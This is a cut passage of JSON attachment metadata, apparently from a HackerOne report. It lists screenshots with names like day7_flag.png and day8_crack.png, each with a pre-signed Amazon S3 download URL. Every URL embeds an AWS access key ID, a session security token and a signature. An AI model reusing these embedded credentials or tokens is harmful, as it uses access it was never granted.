Ar2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=299ca0924570b9c0285f7c1fe83114b88437d77b77b97571769684b8b5e4f0a9"},{"id":1139683,"filename":"day6_secretadmin.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ce5hazusf78n1s6vnrgcgi4mgvij?response-content-disposition=attachment%3B%20filename%3D%22day6_secretadmin.png%22%3B%20filename%2A%3DUTF-8%27%27day6_secretadmin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5ac36024f08e13ddb56045ddd419a6468972359127cedfdf8df198a9a7feaaa8"},{"id":1139684,"filename":"day7_403.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ah8nrqujpv2vhwuav7pvqb7iz2f4?response-content-disposition=attachment%3B%20filename%3D%22day7_403.png%22%3B%20filename%2A%3DUTF-8%27%27day7_403.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=aff2d9e6d6c7793e6ae4dcc9c308fee0262c1293c80dfefb6d72eeda5637fbb3"},{"id":1139685,"filename":"day6_solved.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e01unc71drsv6tplk9nmbeiw89w?response-content-disposition=attachment%3B%20filename%3D%22day6_solved.png%22%3B%20filename%2A%3DUTF-8%27%27day6_solved.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bc7713adfcb3e3b63cbaf96a1b433302369f41b293afdea304806340ecd05b57"},{"id":1139686,"filename":"day7_guesswhat.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g2uys1vvidl4xx1p6kijqd34zpuh?response-content-disposition=attachment%3B%20filename%3D%22day7_guesswhat.png%22%3B%20filename%2A%3DUTF-8%27%27day7_guesswhat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=88e3df87153452b34f28759c758457bbb04088cce09a3b07ab1fa17b1b32c5ac"},{"id":1139687,"filename":"day7_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0j2bz3r50zb6r8omduwq1bioi0v3?response-content-disposition=attachment%3B%20filename%3D%22day7_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day7_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8c7dad20a73e4f7d31d3424b9b57e27dd955b4784e7da9f77a8fc2572011049c"},{"id":1139688,"filename":"day7_guesswhat_rendered.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yf1i9rnpq2mjkfsasn75124gp93y?response-content-disposition=attachment%3B%20filename%3D%22day7_guesswhat_rendered.png%22%3B%20filename%2A%3DUTF-8%27%27day7_guesswhat_rendered.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9e1197b0911adfe3b7c09d0d7277c155f5829beb780d9c49310645527244b2f2"},{"id":1139689,"filename":"day7_sorry.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zf0puyh9tpi38m8kzhfkscmjbvd8?response-content-disposition=attachment%3B%20filename%3D%22day7_sorry.png%22%3B%20filename%2A%3DUTF-8%27%27day7_sorry.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dac4621b868c581e336c4829ce8ddd52cbe38bfb0f828aadb7b19ab620829136"},{"id":1139690,"filename":"day7_own_data.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0rcvuqrs6mk67qsqlkgu5lg5pkvs?response-content-disposition=attachment%3B%20filename%3D%22day7_own_data.png%22%3B%20filename%2A%3DUTF-8%27%27day7_own_data.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=68ae4179abc77484743cd03e1079d1d42cfcd5f73ed7deb91678e28e5e44720e"},{"id":1139691,"filename":"day7_templates.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t0c2fhypd3ew3ny7poczyn9lsn4r?response-content-disposition=attachment%3B%20filename%3D%22day7_templates.png%22%3B%20filename%2A%3DUTF-8%27%27day7_templates.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c29c8221323013896bc5934d7d02c1c76284a422a3a2afdb0339a77b98b7634c"},{"id":1139692,"filename":"day8_crack.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rakykh4q16pcpsh971bg0qg5svy5?response-content-disposition=attachment%3B%20filename%3D%22day8_crack.png%22%3B%20filename%2A%3DUTF-8%27%27day8_crack.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3